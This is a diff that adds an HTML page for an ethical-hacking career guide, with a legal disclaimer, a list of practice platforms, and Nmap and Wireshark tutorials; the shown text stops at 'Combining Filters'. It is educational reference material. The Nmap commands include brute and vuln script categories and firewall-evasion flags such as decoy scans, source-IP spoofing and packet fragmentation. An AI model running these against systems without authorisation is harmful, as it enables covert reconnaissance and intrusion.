@@ -1,0 +1,2813 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethical Hacking Mastery Guide - Start Your Cybersecurity Career</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-sql.min.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #000000 0%, #0d0d0d 50%, #1a0d0d 100%);
+            min-height: 100vh;
+            color: #e0e0e0;
+            line-height: 1.7;
+        }
+        
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            text-align: center;
+            padding: 60px 20px;
+            background: linear-gradient(180deg, rgba(0, 255, 0, 0.1) 0%, transparent 100%);
+            border-bottom: 3px solid #00ff00;
+            margin-bottom: 40px;
+            position: relative;
+        }
+        
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #00ff00, #00ff88, #00ff00, transparent);
+        }
+        
+        h1 {
+            font-size: 3.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00ff00, #00ff88, #00ffcc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 15px;
+            text-shadow: 0 0 80px rgba(0, 255, 0, 0.5);
+            letter-spacing: 2px;
+        }
+        
+        .subtitle {
+            font-size: 1.4rem;
+            color: #888;
+            font-weight: 300;
+            margin-bottom: 10px;
+        }
+        
+        .purpose-banner {
+            background: linear-gradient(135deg, rgba(0, 100, 0, 0.3), rgba(0, 50, 0, 0.5));
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 15px 30px;
+            margin-top: 25px;
+            display: inline-block;
+        }
+        
+        .purpose-banner span {
+            color: #00ff00;
+            font-weight: 600;
+        }
+        
+        .badge-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 25px;
+            flex-wrap: wrap;
+        }
+        
+        .badge {
+            background: linear-gradient(135deg, #0a1a0a, #1a2a1a);
+            border: 1px solid #00ff00;
+            padding: 8px 18px;
+            border-radius: 25px;
+            font-size: 0.85rem;
+            color: #00ff88;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        
+        .section {
+            background: linear-gradient(135deg, rgba(15, 15, 15, 0.95), rgba(10, 10, 10, 0.98));
+            border: 1px solid #222;
+            border-radius: 16px;
+            padding: 35px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
+        }
+        
+        .section:hover {
+            border-color: #00ff00;
+            box-shadow: 0 10px 50px rgba(0, 255, 0, 0.1);
+        }
+        
+        h2 {
+            font-size: 2rem;
+            color: #00ff00;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #1a3a1a;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        h2 .icon {
+            font-size: 1.8rem;
+        }
+        
+        h3 {
+            font-size: 1.4rem;
+            color: #00ff88;
+            margin: 30px 0 15px 0;
+            padding-left: 15px;
+            border-left: 4px solid #00ff00;
+        }
+        
+        h4 {
+            font-size: 1.15rem;
+            color: #00ccaa;
+            margin: 25px 0 12px 0;
+        }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(450px, 1fr));
+            gap: 25px;
+            margin-top: 25px;
+        }
+        
+        .card {
+            background: rgba(5, 5, 5, 0.8);
+            border: 1px solid #1a1a1a;
+            border-radius: 12px;
+            padding: 22px;
+            transition: all 0.3s ease;
+        }
+        
+        .card:hover {
+            border-color: #00ff00;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(0, 255, 0, 0.1);
+        }
+        
+        .card-title {
+            font-size: 1.15rem;
+            color: #00ff88;
+            font-weight: 600;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .card-title::before {
+            content: '>';
+            color: #00ff00;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: bold;
+        }
+        
+        pre {
+            background: #050508 !important;
+            border: 1px solid #1a1a1a;
+            border-radius: 10px;
+            padding: 18px !important;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', monospace !important;
+            font-size: 0.85rem !important;
+            margin: 18px 0;
+            line-height: 1.6 !important;
+        }
+        
+        code {
+            font-family: 'JetBrains Mono', monospace !important;
+            background: rgba(0, 255, 0, 0.1);
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            color: #00ff88;
+        }
+        
+        pre code {
+            background: transparent !important;
+            padding: 0 !important;
+            color: inherit !important;
+        }
+        
+        .command-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 12px;
+            margin: 18px 0;
+        }
+        
+        .cmd-item {
+            background: rgba(0, 50, 0, 0.15);
+            border: 1px solid #0a2a0a;
+            border-radius: 8px;
+            padding: 14px 16px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+        }
+        
+        .cmd-item strong {
+            color: #00ff88;
+            display: block;
+        }
+        
+        .cmd-item span {
+            color: #666;
+            display: block;
+            font-size: 0.78rem;
+            margin-top: 6px;
+        }
+        
+        .ascii-box {
+            background: #050508;
+            border: 1px solid #1a1a1a;
+            border-radius: 10px;
+            padding: 22px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.72rem;
+            line-height: 1.35;
+            overflow-x: auto;
+            color: #00ff00;
+            white-space: pre;
+            margin: 22px 0;
+        }
+        
+        .warning-box {
+            background: linear-gradient(135deg, rgba(255, 150, 0, 0.15), rgba(200, 100, 0, 0.1));
+            border: 2px solid #ff9900;
+            border-radius: 12px;
+            padding: 20px 25px;
+            margin: 25px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+        
+        .warning-box::before {
+            content: '⚠️';
+            font-size: 1.8rem;
+            flex-shrink: 0;
+        }
+        
+        .warning-box strong {
+            color: #ffaa00;
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        .legal-box {
+            background: linear-gradient(135deg, rgba(0, 100, 200, 0.15), rgba(0, 50, 150, 0.1));
+            border: 2px solid #0088ff;
+            border-radius: 12px;
+            padding: 20px 25px;
+            margin: 25px 0;
+        }
+        
+        .legal-box strong {
+            color: #00aaff;
+        }
+        
+        .tip-box {
+            background: linear-gradient(135deg, rgba(0, 150, 0, 0.15), rgba(0, 100, 50, 0.1));
+            border: 1px solid #00aa44;
+            border-radius: 10px;
+            padding: 18px 22px;
+            margin: 22px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+        
+        .tip-box::before {
+            content: '💡';
+            font-size: 1.5rem;
+        }
+        
+        .flow-diagram {
+            background: linear-gradient(90deg, #050505, #0a0a0a, #050505);
+            border: 1px solid #1a1a1a;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 25px 0;
+            text-align: center;
+        }
+        
+        .flow-diagram .step {
+            display: inline-block;
+            background: linear-gradient(135deg, #003300, #004400);
+            padding: 12px 22px;
+            border-radius: 8px;
+            margin: 8px;
+            font-weight: 600;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+        }
+        
+        .flow-diagram .arrow {
+            color: #00ff00;
+            font-size: 1.6rem;
+            margin: 0 8px;
+        }
+        
+        ul, ol {
+            margin: 18px 0;
+            padding-left: 28px;
+        }
+        
+        li {
+            margin: 10px 0;
+            color: #c0c0c0;
+        }
+        
+        li::marker {
+            color: #00ff00;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 22px 0;
+        }
+        
+        th, td {
+            padding: 14px 18px;
+            text-align: left;
+            border: 1px solid #1a1a1a;
+        }
+        
+        th {
+            background: rgba(0, 100, 0, 0.3);
+            color: #00ff88;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+        }
+        
+        td {
+            background: rgba(5, 5, 5, 0.6);
+        }
+        
+        tr:hover td {
+            background: rgba(0, 50, 0, 0.2);
+        }
+        
+        .quick-ref {
+            background: linear-gradient(135deg, #001a00, #002200);
+            border: 2px solid #00ff00;
+            border-radius: 12px;
+            padding: 28px;
+            margin: 28px 0;
+        }
+        
+        .quick-ref h4 {
+            color: #00ff00;
+            margin-bottom: 18px;
+            font-size: 1.3rem;
+            border-bottom: 1px solid #003300;
+            padding-bottom: 10px;
+        }
+        
+        .tool-header {
+            background: linear-gradient(135deg, #001500, #002000);
+            border: 1px solid #00ff00;
+            border-radius: 12px;
+            padding: 20px 25px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        
+        .tool-name {
+            font-size: 1.5rem;
+            color: #00ff00;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .tool-meta {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .tool-meta span {
+            background: rgba(0, 255, 0, 0.1);
+            padding: 5px 12px;
+            border-radius: 15px;
+            font-size: 0.8rem;
+            color: #00ff88;
+        }
+        
+        .career-path {
+            background: linear-gradient(135deg, #0a0a15, #050510);
+            border: 2px solid #00aaff;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 25px 0;
+        }
+        
+        .career-path h4 {
+            color: #00aaff;
+            margin-bottom: 18px;
+        }
+        
+        .level-badge {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin-left: 8px;
+        }
+        
+        .level-beginner { background: #00aa00; color: #000; }
+        .level-intermediate { background: #ffaa00; color: #000; }
+        .level-advanced { background: #ff4444; color: #fff; }
+        .level-expert { background: #aa00aa; color: #fff; }
+        
+        .step-number {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 32px;
+            height: 32px;
+            background: #00ff00;
+            color: #000;
+            border-radius: 50%;
+            font-weight: 700;
+            margin-right: 12px;
+            font-size: 0.9rem;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 50px 20px;
+            border-top: 2px solid #1a1a1a;
+            margin-top: 60px;
+            color: #555;
+        }
+        
+        footer p {
+            margin: 8px 0;
+        }
+        
+        .resources-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 18px;
+            margin: 22px 0;
+        }
+        
+        .resource-card {
+            background: rgba(0, 50, 0, 0.1);
+            border: 1px solid #0a2a0a;
+            border-radius: 10px;
+            padding: 18px;
+            transition: all 0.3s ease;
+        }
+        
+        .resource-card:hover {
+            border-color: #00ff00;
+            background: rgba(0, 80, 0, 0.15);
+        }
+        
+        .resource-card .name {
+            color: #00ff88;
+            font-weight: 600;
+            font-size: 1.05rem;
+            margin-bottom: 8px;
+        }
+        
+        .resource-card .url {
+            color: #00aaff;
+            font-size: 0.85rem;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        
+        .resource-card .desc {
+            color: #888;
+            font-size: 0.85rem;
+            margin-top: 10px;
+        }
+        
+        @media (max-width: 768px) {
+            h1 { font-size: 2.2rem; }
+            .grid { grid-template-columns: 1fr; }
+            .command-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔓 ETHICAL HACKING MASTERY GUIDE</h1>
+            <p class="subtitle">Your Complete Roadmap to a Cybersecurity Career</p>
+            <div class="purpose-banner">
+                <span>📚 EDUCATIONAL PURPOSE ONLY</span> — Learn ethical hacking to protect systems, not harm them
+            </div>
+            <div class="badge-container">
+                <span class="badge">Wireshark</span>
+                <span class="badge">Bug Bounty</span>
+                <span class="badge">SQL Injection</span>
+                <span class="badge">Nmap</span>
+                <span class="badge">Burp Suite</span>
+                <span class="badge">Metasploit</span>
+                <span class="badge">John the Ripper</span>
+            </div>
+        </header>
+
+        <!-- Legal Disclaimer -->
+        <div class="legal-box">
+            <strong>⚖️ LEGAL DISCLAIMER</strong>
+            <p>This guide is for <strong>educational purposes only</strong>. All techniques described should only be practiced on:</p>
+            <ul style="margin: 10px 0;">
+                <li>Your own systems and networks</li>
+                <li>Systems where you have explicit written permission</li>
+                <li>Authorized bug bounty programs</li>
+                <li>Legal capture-the-flag (CTF) platforms</li>
+                <li>Dedicated practice labs (HackTheBox, TryHackMe, etc.)</li>
+            </ul>
+            <p><strong>Unauthorized access to computer systems is illegal</strong> and can result in severe criminal penalties under laws such as the Computer Fraud and Abuse Act (CFAA) and similar legislation worldwide.</p>
+        </div>
+
+        <!-- Section 1: Getting Started -->
+        <section class="section">
+            <h2><span class="icon">🎯</span> Getting Started in Ethical Hacking</h2>
+            
+            <div class="quick-ref">
+                <h4>Prerequisites Before You Begin</h4>
+                <div class="grid">
+                    <div class="card">
+                        <div class="card-title">Technical Foundations</div>
+                        <ul>
+                            <li>Basic networking (TCP/IP, HTTP, DNS)</li>
+                            <li>Linux command line proficiency</li>
+                            <li>Understanding of operating systems</li>
+                            <li>Basic programming (Python, Bash)</li>
+                            <li>Web technologies (HTML, CSS, JavaScript)</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <div class="card-title">Mindset & Ethics</div>
+                        <ul>
+                            <li>Strong ethical compass</li>
+                            <li>Curiosity and persistence</li>
+                            <li>Attention to detail</li>
+                            <li>Continuous learning attitude</li>
+                            <li>Legal awareness and compliance</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <h3>The Ethical Hacking Career Path</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    ETHICAL HACKING CAREER PROGRESSION                        │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   STAGE 1: FOUNDATION                                                        │
+│   ├── Learn Linux (Kali/Parrot OS)                                          │
+│   ├── Networking Fundamentals (CompTIA Network+)                            │
+│   ├── Programming Basics (Python, Bash)                                      │
+│   └── Time: 3-6 months                                                       │
+│                                                                              │
+│   STAGE 2: SECURITY FUNDAMENTALS                                             │
+│   ├── CompTIA Security+                                                      │
+│   ├── Web Application Security (OWASP)                                       │
+│   ├── Network Security Basics                                                │
+│   └── Time: 6-12 months                                                      │
+│                                                                              │
+│   STAGE 3: HANDS-ON PRACTICE                                                 │
+│   ├── TryHackMe, HackTheBox, VulnHub                                        │
+│   ├── CTF Competitions                                                       │
+│   ├── Bug Bounty Programs                                                    │
+│   └── Time: 6-12 months                                                      │
+│                                                                              │
+│   STAGE 4: CERTIFICATION                                                     │
+│   ├── CEH (Certified Ethical Hacker)                                        │
+│   ├── OSCP (Offensive Security Certified Professional)                       │
+│   ├── eJPT, PNPT (Entry-level pentesting)                                   │
+│   └── Time: 3-6 months                                                       │
+│                                                                              │
+│   STAGE 5: CAREER ENTRY                                                      │
+│   ├── Junior Penetration Tester                                             │
+│   ├── Security Analyst                                                       │
+│   ├── Bug Bounty Hunter (Freelance)                                         │
+│   └── Time: Ongoing                                                          │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘</div>
+
+            <h3>Essential Practice Platforms</h3>
+            <div class="resources-grid">
+                <div class="resource-card">
+                    <div class="name">Hack The Box</div>
+                    <div class="url">hackthebox.com</div>
+                    <div class="desc">Real-world machines to hack, CTF challenges, and Academy courses</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">TryHackMe</div>
+                    <div class="url">tryhackme.com</div>
+                    <div class="desc">Beginner-friendly rooms with guided learning paths</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">PortSwigger Academy</div>
+                    <div class="url">portswigger.net/web-security</div>
+                    <div class="desc">Free web security academy by Burp Suite creators</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">VulnHub</div>
+                    <div class="url">vulnhub.com</div>
+                    <div class="desc">Downloadable vulnerable VMs for local practice</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">PentesterLab</div>
+                    <div class="url">pentesterlab.com</div>
+                    <div class="desc">Web application security exercises</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">OverTheWire</div>
+                    <div class="url">overthewire.org</div>
+                    <div class="desc">Wargames to learn Linux and security concepts</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 2: Nmap -->
+        <section class="section">
+            <h2><span class="icon">🔍</span> Nmap - Network Discovery & Security Scanning</h2>
+            
+            <div class="tool-header">
+                <div class="tool-name">🔎 Nmap</div>
+                <div class="tool-meta">
+                    <span>Network Scanner</span>
+                    <span>Port Discovery</span>
+                    <span>Service Detection</span>
+                </div>
+            </div>
+            
+            <p>Nmap ("Network Mapper") is the industry standard for network discovery and security auditing. It's used by security professionals worldwide to discover hosts, services, and vulnerabilities on networks.</p>
+            
+            <h3>Installation</h3>
+            <pre><code class="language-bash"># Kali Linux / Debian / Ubuntu
+sudo apt update && sudo apt install nmap
+
+# CentOS / RHEL / Fedora
+sudo yum install nmap
+# or
+sudo dnf install nmap
+
+# macOS
+brew install nmap
+
+# Windows (download from nmap.org)
+# https://nmap.org/download.html
+
+# Verify installation
+nmap --version</code></pre>
+            
+            <h3>Basic Scanning Techniques</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Host Discovery</div>
+                    <pre><code class="language-bash"># Ping sweep - discover live hosts
+nmap -sn 192.168.1.0/24
+
+# Skip host discovery (scan all hosts)
+nmap -Pn 192.168.1.100
+
+# ARP ping discovery (local network)
+nmap -PR 192.168.1.0/24
+
+# TCP SYN ping
+nmap -PS22,80,443 192.168.1.100
+
+# UDP ping
+nmap -PU53,161 192.168.1.100</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Port Scanning</div>
+                    <pre><code class="language-bash"># Scan most common 1000 ports
+nmap 192.168.1.100
+
+# Scan all 65535 ports
+nmap -p- 192.168.1.100
+
+# Scan specific ports
+nmap -p 22,80,443 192.168.1.100
+
+# Scan port range
+nmap -p 1-1000 192.168.1.100
+
+# Fast scan (top 100 ports)
+nmap -F 192.168.1.100</code></pre>
+                </div>
+            </div>
+            
+            <h3>Scan Types Explained</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                         NMAP SCAN TYPES                                      │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   TCP SCAN TYPES:                                                            │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │ -sS (SYN Scan) - DEFAULT, Stealth, Half-open                       │   │
+│   │     → Sends SYN, waits for SYN/ACK (open) or RST (closed)          │   │
+│   │     → Fast, rarely logged, requires root                           │   │
+│   │                                                                     │   │
+│   │ -sT (TCP Connect) - Full connection, No root required              │   │
+│   │     → Completes 3-way handshake, easily logged                     │   │
+│   │     → Use when you don't have root privileges                      │   │
+│   │                                                                     │   │
+│   │ -sA (ACK Scan) - Firewall rule detection                           │   │
+│   │     → Maps firewall rules, not for port discovery                  │   │
+│   │                                                                     │   │
+│   │ -sF (FIN), -sN (NULL), -sX (Xmas) - Stealth scans                  │   │
+│   │     → Bypass some firewalls, exploits RFC behavior                 │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+│   UDP SCAN:                                                                  │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │ -sU (UDP Scan) - Slower, discovers UDP services                    │   │
+│   │     → DNS (53), SNMP (161), DHCP (67/68), NTP (123)               │   │
+│   │     → Open: response | Closed: ICMP unreachable                    │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+│   UDP Scan: -sU                                                              │
+│   ┌────────────┐                      ┌────────────┐                       │
+│   │  Scanner   │──── UDP Packet ────▶│   Target   │                       │
+│   │            │◀── Response ────────│            │                       │
+│   └────────────┘   (if open)          └────────────┘                       │
+│                    or ICMP unreachable (if closed)                          │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Service & Version Detection</h3>
+            <pre><code class="language-bash"># Service version detection
+nmap -sV 192.168.1.100
+
+# Aggressive version detection (more probes)
+nmap -sV --version-intensity 5 192.168.1.100
+
+# Light version detection (faster)
+nmap -sV --version-intensity 0 192.168.1.100
+
+# Operating System detection
+nmap -O 192.168.1.100
+
+# OS detection with aggressive guessing
+nmap -O --osscan-guess 192.168.1.100
+
+# Combined: Service + OS + Traceroute + Scripts
+nmap -A 192.168.1.100
+
+# Comprehensive scan
+nmap -sS -sV -O -sC 192.168.1.100</code></pre>
+            
+            <h3>Nmap Scripting Engine (NSE)</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Default Scripts</div>
+                    <pre><code class="language-bash"># Run default scripts
+nmap -sC 192.168.1.100
+
+# Run specific script category
+nmap --script auth 192.168.1.100
+nmap --script vuln 192.168.1.100
+nmap --script discovery 192.168.1.100
+nmap --script brute 192.168.1.100</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Specific Scripts</div>
+                    <pre><code class="language-bash"># SMB enumeration
+nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
+
+# SSH algorithms
+nmap --script ssh-auth-methods 192.168.1.100
+
+# HTTP enumeration
+nmap --script http-enum 192.168.1.100
+
+# Vulnerability scanning
+nmap --script vuln 192.168.1.100
+
+# All HTTP scripts
+nmap --script "http-*" 192.168.1.100</code></pre>
+                </div>
+            </div>
+            
+            <h3>Output Options</h3>
+            <pre><code class="language-bash"># Normal output
+nmap -oN scan_results.txt 192.168.1.100
+
+# XML output (for parsing/tools)
+nmap -oX scan_results.xml 192.168.1.100
+
+# Grepable output
+nmap -oG scan_results.gnmap 192.168.1.100
+
+# All formats at once
+nmap -oA scan_results 192.168.1.100
+# Creates: scan_results.txt, .xml, .gnmap
+
+# Verbose output
+nmap -v 192.168.1.100
+nmap -vv 192.168.1.100      # More verbose
+
+# Debug output
+nmap -d 192.168.1.100
+nmap -dd 192.168.1.100      # More debug</code></pre>
+            
+            <h3>Practical Examples</h3>
+            <div class="card">
+                <div class="card-title">Real-World Nmap Workflows</div>
+                <pre><code class="language-bash"># Quick network overview
+nmap -sn 192.168.1.0/24 -oG - | grep "Up"
+
+# Comprehensive web server scan
+nmap -sS -sV -O -p- --script "vuln and http-*" -oA webserver_scan target.com
+
+# Scan for specific vulnerabilities
+nmap --script ssl-heartbleed,ssl-poodle -p 443 target.com
+
+# Firewall evasion techniques
+nmap -f 192.168.1.100                    # Fragment packets
+nmap -D RND:10 192.168.1.100            # Decoy scan
+nmap -S spoofed_ip 192.168.1.100        # Spoof source IP
+nmap --source-port 53 192.168.1.100     # Source port manipulation
+
+# Timing templates (T0-T5, T3 is default)
+nmap -T0 192.168.1.100    # Paranoid (very slow)
+nmap -T1 192.168.1.100    # Sneaky
+nmap -T2 192.168.1.100    # Polite
+nmap -T3 192.168.1.100    # Normal (default)
+nmap -T4 192.168.1.100    # Aggressive
+nmap -T5 192.168.1.100    # Insane (very fast)</code></pre>
+            </div>
+            
+            <div class="tip-box">
+                <div>
+                    <strong>Pro Tip:</strong> Always start with <code>-sn</code> to discover live hosts before scanning ports. Use <code>-Pn</code> when you know hosts are up but blocking ping. The <code>-A</code> flag combines multiple useful options for quick reconnaissance.
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 3: Wireshark -->
+        <section class="section">
+            <h2><span class="icon">🦈</span> Wireshark - Network Protocol Analysis</h2>
+            
+            <div class="tool-header">
+                <div class="tool-name">🦈 Wireshark</div>
+                <div class="tool-meta">
+                    <span>Packet Analysis</span>
+                    <span>Network Forensics</span>
+                    <span>Protocol Debugging</span>
+                </div>
+            </div>
+            
+            <p>Wireshark is the world's most widely used network protocol analyzer. It lets you capture and interactively browse the traffic running on a computer network, making it essential for security analysis and troubleshooting.</p>
+            
+            <h3>Installation</h3>
+            <pre><code class="language-bash"># Kali Linux / Debian / Ubuntu
+sudo apt update && sudo apt install wireshark
+
+# Add user to wireshark group (to capture without root)
+sudo usermod -aG wireshark $USER
+
+# CentOS / RHEL / Fedora
+sudo yum install wireshark wireshark-gnome
+
+# macOS
+brew install --cask wireshark
+
+# Windows
+# Download from https://www.wireshark.org/download.html
+
+# Verify installation
+wireshark --version
+
+# Command-line version (tshark)
+sudo apt install tshark
+tshark --version</code></pre>
+            
+            <h3>Understanding the Interface</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                      WIRESHARK INTERFACE LAYOUT                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │  FILTER BAR: [ip.addr == 192.168.1.100              ] [Apply] [Clear]│   │
+│   ├─────────────────────────────────────────────────────────────────────┤   │
+│   │  TOOLBAR: [⏺ Start] [⏹ Stop] [🔄 Restart] [⚙ Settings]            │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │  PACKET LIST (Top Pane)                                             │   │
+│   │  ┌──────┬──────────┬─────────┬──────────────┬────────────────────┐  │   │
+│   │  │ No.  │ Time     │ Source  │ Destination  │ Protocol │ Info    │  │   │
+│   │  ├──────┼──────────┼─────────┼──────────────┼────────────────────┤  │   │
+│   │  │ 1    │ 0.000000 │ 192...  │ 192...       │ TCP      │ SYN     │  │   │
+│   │  │ 2    │ 0.000123 │ 192...  │ 192...       │ TCP      │ SYN/ACK │  │   │
+│   │  │ 3    │ 0.000234 │ 192...  │ 192...       │ TCP      │ ACK     │  │   │
+│   │  └──────┴──────────┴─────────┴──────────────┴────────────────────┘  │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │  PACKET DETAILS (Middle Pane)                                       │   │
+│   │  ▼ Frame 1: 74 bytes                                                │   │
+│   │  ▼ Ethernet II                                                      │   │
+│   │  ▼ Internet Protocol Version 4                                      │   │
+│   │  ▼ Transmission Control Protocol                                    │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │  PACKET BYTES (Bottom Pane)                                         │   │
+│   │  0000  00 0c 29 a3 b4 5c 00 50 56 c0 00 08 08 00 45 00  ..)....PV...E.│   │
+│   │  0010  00 3c 1a 47 40 00 40 06 3c 9a c0 a8 01 64 c0 a8  .<.G@.@.....  │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Essential Display Filters</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">IP Address Filters</div>
+                    <div class="command-grid">
+                        <div class="cmd-item">
+                            <strong>ip.addr == 192.168.1.100</strong>
+                            <span>Traffic to/from IP</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>ip.src == 192.168.1.100</strong>
+                            <span>Source IP only</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>ip.dst == 192.168.1.100</strong>
+                            <span>Destination IP only</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>ip.addr == 192.168.1.0/24</strong>
+                            <span>Entire subnet</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Protocol Filters</div>
+                    <div class="command-grid">
+                        <div class="cmd-item">
+                            <strong>tcp</strong>
+                            <span>All TCP traffic</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>udp</strong>
+                            <span>All UDP traffic</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>http</strong>
+                            <span>HTTP traffic</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>dns</strong>
+                            <span>DNS queries</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Port Filters</div>
+                    <div class="command-grid">
+                        <div class="cmd-item">
+                            <strong>tcp.port == 80</strong>
+                            <span>TCP port 80</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>tcp.port == 443 || tcp.port == 80</strong>
+                            <span>HTTP/HTTPS</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>tcp.dstport == 22</strong>
+                            <span>SSH connections</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>udp.port == 53</strong>
+                            <span>DNS over UDP</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Advanced Filters</div>
+                    <div class="command-grid">
+                        <div class="cmd-item">
+                            <strong>http.request.method == "POST"</strong>
+                            <span>POST requests only</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>http contains "password"</strong>
+                            <span>Password in HTTP</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>tcp.flags.syn == 1</strong>
+                            <span>SYN packets</span>
+                        </div>
+                        <div class="cmd-item">
+                            <strong>frame contains "login"</strong>
+                            <span>Any "login" string</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <h3>Combining Filters</h3>
